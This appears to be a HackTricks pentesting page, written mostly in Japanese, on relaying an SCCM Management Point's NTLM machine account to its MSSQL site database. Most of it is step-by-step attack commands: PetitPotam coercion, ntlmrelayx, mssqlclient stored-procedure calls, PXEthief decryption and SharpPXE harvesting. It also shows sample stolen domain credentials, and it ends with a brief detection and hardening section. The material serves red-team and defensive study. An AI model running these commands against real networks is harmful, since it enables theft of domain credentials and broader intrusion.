# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
**System Center Configuration Manager (SCCM) Management Point (MP)** に SMB/RPC 経由で認証するよう強制し、その NTLM machine account を **site database (MSSQL)** に **relaying** することで、`smsdbrole_MP` / `smsdbrole_MPUserSvc` の権限を取得できます。これらの role により、**Operating System Deployment (OSD)** policy blob（Network Access Account credentials、Task-Sequence variables など）を公開する一連の stored procedure を呼び出せます。blob は hex-encoded/encrypted ですが、**PXEthief** で decode および decrypt でき、plaintext の secrets を得られます。

High-level chain:
1. MP と site DB を発見 ↦ 認証不要の HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` を起動。
3. **PetitPotam**、PrinterBug、DFSCoerce などを使用して MP に coercion を実行。
4. SOCKS proxy 経由で `mssqlclient.py -windows-auth` を使用し、relayed **<DOMAIN>\\<MP-host>$** account として接続。
5. 以下を実行:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'` （または `MP_GetPolicyBodyAfterAuthorization`）
6. `0xFFFE` BOM を strip し、`xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`。

`OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` などの secrets を、PXE や clients に触れることなく recover できます。<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
MP ISAPI extension **GetAuth.dll** は、authentication を必要としない複数の parameters を公開しています（site が PKI-only の場合を除く）。<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | site signing cert の public key と、*x86* / *x64* **All Unknown Computers** devices の GUIDs を返します。 |
| `MPLIST` | site 内のすべての Management-Point を一覧表示します。 |
| `SITESIGNCERT` | Primary-Site signing certificate を返します（LDAP を使用せずに site server を識別）。 |

後続の DB queries で **clientID** として使用する GUIDs を取得します:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP machine account を MSSQL に Relay
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
coercion が発生すると、次のように表示されます:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. stored proceduresを介してOSD policiesを特定する
デフォルトでポート1080を使用するSOCKS proxy経由で接続します:<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB に切り替えます（3 桁のサイトコードを使用します。例: `CM_001`）。

### 3.1  Unknown-Computer GUID の検索（オプション）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  割り当てられたポリシーの一覧表示
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
各行には `PolicyAssignmentID`、`Body`（hex）、`PolicyID`、`PolicyVersion` が含まれます。

次の policy に注目します。
* **NAAConfig** – Network Access Account の creds
* **TS_Sequence** – Task Sequence の variables（OSDJoinAccount/Password）
* **CollectionSettings** – run-as accounts が含まれる場合があります

### 3.3 完全な body を取得
すでに `PolicyID` と `PolicyVersion` がある場合は、次を使用して clientID の要件をスキップできます:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT: SSMSで「Maximum Characters Retrieved」を増やしてください（>65535）。そうしないとblobがtruncatedされます。

---

## 4. blobをDecode & decryptする
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
回収された secrets の例:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 関連する SQL roles と procedures
relay 後、login は以下にマッピングされます:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

これらの roles では数十の EXEC permissions が公開されます。この攻撃で使用する主なものは以下のとおりです。

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID` に適用された policies を一覧表示します。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | policy の完全な body を返します。 |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path によって返されます。 |

以下で完全な一覧を確認できます。
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **UDP/4011 経由の PXE reply**: PXE 用に構成された Distribution Point に PXE boot request を送信する。proxyDHCP response から、`SMSBoot\\x64\\pxe\\variables.dat`（encrypted config）や `SMSBoot\\x64\\pxe\\boot.bcd` などの boot path と、オプションの encrypted key blob が判明する。<sup>[[4]](#references)</sup>
* **TFTP 経由で boot artifacts を取得**: 返された path を使用して、TFTP 経由で `variables.dat` を download する（unauthenticated）。この file は小さく（数 KB）、encrypted media variables が含まれている。
* **Decrypt または crack**:
- response に decryption key が含まれている場合は、**SharpPXE** に渡して `variables.dat` を直接 decrypt する。
- key が提供されない場合（PXE media が custom password で保護されている場合）、SharpPXE は offline cracking 用の **Hashcat-compatible** `$sccm$aes128$...` hash を出力する。password を recovery した後、file を decrypt する。
* **Decrypted XML を parse**: plaintext variables には SCCM deployment metadata（**Management Point URL**、**Site Code**、media GUID、その他の identifier）が含まれている。SharpPXE はこれらを parse し、GUID/PFX/site parameter があらかじめ入力された、follow-on abuse 用の実行可能な **SharpSCCM** command を出力する。
* **Requirements**: PXE listener（UDP/4011）と TFTP への network reachability のみ必要で、local admin privileges は不要。

---

## 7. Detection & Hardening
1. **MP login を monitor** – MP computer account が、自身の host ではない IP から login している場合は、ほぼ relay。<sup>[[1]](#references)</sup>
2. site database で **Extended Protection for Authentication (EPA)** を有効化する（`PREVENT-14`）。
3. 未使用の NTLM を disable し、SMB signing を enforce して、RPC を restrict する（`PetitPotam`/`PrinterBug` に対して使用されるものと同じ mitigation）。
4. IPSec / mutual-TLS により MP ↔ DB communication を harden する。
5. **PXE exposure を constrain** – UDP/4011 と TFTP を trusted VLAN に限定し、PXE password を必須にして、`SMSBoot\\*\\pxe\\variables.dat` の TFTP download を alert する。<sup>[[4]](#references)</sup>

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [Management Point Relay で secrets を steal する: 「Your Manager と話したい」](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
